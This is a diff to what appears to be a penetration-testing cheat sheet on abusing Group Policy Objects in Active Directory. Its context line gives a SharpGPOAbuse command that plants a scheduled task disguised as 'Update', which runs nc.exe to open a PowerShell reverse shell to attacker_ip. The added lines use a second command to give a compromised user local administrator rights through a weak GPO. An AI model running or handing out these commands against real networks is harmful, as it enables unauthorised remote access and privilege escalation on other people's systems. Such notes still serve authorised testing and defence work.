@@ -12,6 +12,10 @@ We can create an "evil" GPO with a scheduled task for example
 
     ./SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author Administrator --Command "cmd.exe" --Arguments "/c /tmp/nc.exe attacker_ip 4545 -e powershell" --GPOName "weakGPO"
 
+OR simply, add our compromised user to the local administrator group
+
+    .\SharpGPOAbuse.exe --AddLocalAdmin --GPOName "weakGPO" --UserAccount USER
+
 # Linux
 
 We can update a GPO with a scheduled task for example to obtain a reverse shell
